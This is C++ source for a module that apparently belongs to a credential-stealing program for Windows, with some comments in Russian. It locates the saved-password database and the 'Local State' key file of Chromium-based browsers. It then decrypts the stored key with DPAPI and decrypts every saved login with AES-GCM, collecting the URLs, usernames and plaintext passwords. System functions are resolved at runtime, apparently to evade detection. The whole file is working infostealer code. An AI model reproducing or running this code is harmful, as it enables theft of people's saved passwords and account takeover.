#include "ChromeParser.h"

#include <memory>
#include <sqlite3.h>
#include <Base64.h>
#include <json.hpp>


List<AccountData> chromium_parser::collect_data()
{
	for(const auto& browser : m_chromium_list)
	{
		try_collect(browser);	}

	return m_collected_data;
}

void chromium_parser::try_collect(const String& chromium_path)
{

	List<AccountData> out_data;
	if (!get_path_to_db(chromium_path)) return;

	sqlite3* db;

	if (sqlite3_open(m_chrome_sqlite_path.c_str(), &db) != SQLITE_OK)
		return;


	sqlite3_stmt* stmt;
	if (sqlite3_prepare_v2(db, "SELECT origin_url, username_value, password_value FROM logins", -1, &stmt, 0) != SQLITE_OK)
		return;

	int entries = 0;

	if (!get_decryption_key(chromium_path)) return;

	while (sqlite3_step(stmt) == SQLITE_ROW)
	{

		AccountData user_data;

		char* url = (char*)sqlite3_column_text(stmt, 0);
		char* username = (char*)sqlite3_column_text(stmt, 1);
		char* password = (char*)sqlite3_column_text(stmt, 2);

		if (url == nullptr && username == nullptr && password == nullptr)
			break;
		if ((strlen(url) == 0) && (strlen(username) == 0) && (strlen(password) == 0))
			continue;


		user_data.Url = url;
		user_data.Username = username;

		int passSize = sqlite3_column_bytes(stmt, 2);
		char decryptedPass[1024];
		DWORD decPassSize = 0;

		if (((char)password[0] == 'v' && (char)password[1] == '1' && (char)password[2] == '0') ||
			((char)password[0] == 'v' && (char)password[1] == '1' && (char)password[2] == '1'))
		{


			ULONG cbOutput = MAX_SIZE_PASS;
			ULONG cbCiphertext = 0;

			BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO BACMI;
			BCRYPT_INIT_AUTH_MODE_INFO(BACMI); // Макрос инициализирует структуру BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO

			BACMI.pbNonce = (PUCHAR)(password + 3); // Пропускаем префикс "v10".
			BACMI.cbNonce = 12; // Размер Nonce = 12 байт.

			BACMI.pbTag = (PUCHAR)(password + passSize - 16);
			BACMI.cbTag = 16;


			NTSTATUS status = 0;
			const auto func_BCryptDecrypt = WinApiImport<f_BCryptDecrypt>::get_func("BCryptDecrypt", "bcrypt.dll");

			if (!BCRYPT_SUCCESS(status = func_BCryptDecrypt(m_hKey, (BYTE*)(password + 15), passSize - 15 - 16, &BACMI, NULL, 0, (PUCHAR)m_pbOutput, cbOutput, &cbCiphertext, 0)))
			{
				printf("Error: 0x%x\n", status);
			}

			m_pbOutput[cbCiphertext] = '\0';

			user_data.Password = m_pbOutput;
		}
		else
		{
			if (dpapi_decrypt(reinterpret_cast<BYTE*>(password), passSize, decryptedPass))
			{
				user_data.Password = decryptedPass;
			}
			else
			{
				continue;
			}
		}

		out_data.emplace_back(user_data);
		entries++;
	}

	for(const auto& item:  out_data)
	{
		m_collected_data.emplace_back(std::move(item));
	}
}


bool chromium_parser::get_path_to_db(const String& chromium_path)
{
	const auto get_user_path = WinApiImport<f_SHGetFolderPathA>::get_func("SHGetFolderPathA", "shell32.dll");

	
	if (!get_user_path) return false;

	const int local_data_app = 0x001c;
	char _path[MAX_PATH];
	if(get_user_path(NULL, local_data_app, NULL, 0, _path) != S_OK) return false;
	m_chrome_sqlite_path = _path;
	m_chrome_sqlite_path += chromium_path +R"(\User Data\Default\Login Data)";
	return true;	
}

bool chromium_parser::get_decryption_key(const String& chromium_path)
{

	std::string keyBase64;
	DWORD keySize = 0;
	if (!get_chrome_key(keyBase64, keySize, chromium_path))
	{
		return false;
	}
	
	char decryptedKey[8192]; //ключ размером 32 байта (256 бит)

	if (!key_decrypt(keyBase64, keySize, decryptedKey))
	{
		return false;
	}

	const DWORD decKeySize = strlen(decryptedKey);

	init_for_chrome_80();
	init_key_for_chrome_80((PBYTE)decryptedKey, decKeySize);

	if (m_pbOutput == NULL)
	{
		m_pbOutput = new char[MAX_SIZE_PASS];
	}

	return true;
}

bool chromium_parser::get_chrome_key(std::string& key, unsigned long& keySize, const String& chromium_path)
{

	HANDLE hFile = INVALID_HANDLE_VALUE;
	unsigned long  fileSize = 0;
	char* tempBuff = NULL;
	char* chromeKey = NULL;

	String chrome_path;

	if (!get_key_path(chrome_path, chromium_path))
	{
		return FALSE;
	}

	{
		const auto api_create_file_a = WinApiImport<f_CreateFileA>::get_func("CreateFileA", "kernel32.dll");		
		hFile = api_create_file_a(chrome_path.c_str(), GENERIC_READ, 0, 0, OPEN_ALWAYS, 0, 0);

		if (hFile == INVALID_HANDLE_VALUE)
		{
			return FALSE;
		}
	}

	{
		const auto api_get_file_size = WinApiImport<f_GetFileSize>::get_func("GetFileSize", "kernel32.dll");
		fileSize = api_get_file_size(hFile, NULL);

		if (fileSize == 0)
			return false;		
	}	
	
	tempBuff = new char[fileSize];
	
	{
			
		
		const auto api_read_file = WinApiImport<f_ReadFile>::get_func("ReadFile", "kernel32.dll");		
		DWORD numToRead;
		if (!api_read_file(hFile, tempBuff, fileSize, &numToRead, NULL))		
			return false;

		
		tempBuff[numToRead] = L'\0';

		//fileSize = lstrlenA(tempBuff);
	}

	{		
		const auto api_close_handle = WinApiImport<f_CloseHandle>::get_func("CloseHandle", "kernel32.dll");
		if (!api_close_handle(hFile))
			return false;
	}


	auto json_text = nlohmann::json::parse(tempBuff);

	auto empty = json_text.empty();

	if(!json_text.contains("os_crypt")) return false;

	if (!json_text.at("os_crypt").contains("encrypted_key")) return false;

	key = json_text.at("os_crypt").at("encrypted_key").get<std::string>();
	keySize = key.length();
	
	return true;
}

bool chromium_parser::get_key_path(String& keyPath,const String& chromium_path)
{
	const auto get_path = WinApiImport<f_SHGetFolderPathA>::get_func("SHGetFolderPathA", "shell32.dll");
	//получаем путь до AppData
	
	int local_app_data = 0x001c;
	char path[MAX_PATH];
	if (get_path(NULL, local_app_data, NULL, 0, path) == S_OK)
	{
		//файл Local State содержит зашифрованный ключ для AES256-GCM (base64+DPAPI)
		keyPath = path;
		keyPath += chromium_path +R"(\User Data\Local State)";

		return true;
	}

	return false;
}

bool chromium_parser::dpapi_decrypt(unsigned char* encText, unsigned long encTextSize, char* decText)
{
	DATA_BLOB in;
	DATA_BLOB out;

	in.pbData = encText;
	in.cbData = encTextSize;




	
	WinApiImport<f_CryptUnprotectData> api_import("CryptUnprotectData", "crypt32.dll");
	auto f_CryptUnprotectData = api_import.get_function();
	
	if (f_CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out))
	{
		for (int i = 0; i < out.cbData; i++)
			decText[i] = out.pbData[i];
		decText[out.cbData] = '\0';

		return true;
	}

	return false;
}

bool chromium_parser::init_for_chrome_80()
{
	bool bRet = false;
	do
	{
		{
			WinApiImport<f_BCryptOpenAlgorithmProvider> api_import("BCryptOpenAlgorithmProvider", "bcrypt.dll");
			auto f_BCryptOpenAlgorithmProvider = api_import.get_function();

			if (f_BCryptOpenAlgorithmProvider(&m_hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0)
			{
				printf("[DEBUG] Crypt::BCrypt::Init: can't initialize cryptoprovider. Last error code: %d \n",
					GetLastError());
				break;
			}
		}

		{
			WinApiImport<f_BCryptSetProperty> api_import("BCryptSetProperty", "bcrypt.dll");
			auto f_BCryptSetProperty = api_import.get_function();
			
			if (f_BCryptSetProperty(m_hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM),
				0) != 0)
			{
				printf("[DEBUG] Crypt::BCrypt::Init: can't set chaining mode. Last error code: %d \n", GetLastError());
				break;
			}
		}
		
		bRet = true;
	}
	while (false);

	return bRet;	
}

bool chromium_parser::init_key_for_chrome_80(PBYTE pbKey, ULONG sizeKey)
{
	bool bRet = true;
	
	WinApiImport<f_BCryptGenerateSymmetricKey> api_import("BCryptGenerateSymmetricKey", "bcrypt.dll");
	const auto f_BCryptGenerateSymmetricKey = api_import.get_function();

	if (f_BCryptGenerateSymmetricKey(m_hAlg, &m_hKey, NULL, 0, pbKey, sizeKey, 0) != 0)
	{
		printf("[DEBUG] Crypt::BCrypt::Init: can't deinitialize cryptoprovider. Last error code: %d \n",
		       GetLastError());
		bRet = false;
	}

	return bRet;	
}

bool chromium_parser::key_decrypt(std::string keyBase64, DWORD keySize, char* decKey)
{
	char* keyEncDPAPI = NULL;
	DWORD keyEncDPAPISize = 0;
	BYTE* keyEnc = NULL;
	DWORD keyEncSize = 0;

	keyEncDPAPI = new char[keySize];

	//расшифровываем base64
	auto key_decoded = base64_decryptor::base64_decode(keyBase64);
	
	keyEncDPAPISize = key_decoded.length();

	keyEncDPAPI = (char*) key_decoded.c_str();
	

	keyEnc = new BYTE[keyEncDPAPISize - DPAPI_PREFIX_LEN];


	//убираем префикс "DPAPI"
	int counter = 0;
	for (int i = DPAPI_PREFIX_LEN; i < keyEncDPAPISize; i++)
	{
		keyEnc[counter++] = keyEncDPAPI[i];
	}

	if (dpapi_decrypt(keyEnc, (keyEncDPAPISize - DPAPI_PREFIX_LEN), (decKey)))
	{
		//delete[] keyEncDPAPI;
		delete[] keyEnc;
		return true;
	}

	return FALSE;
}
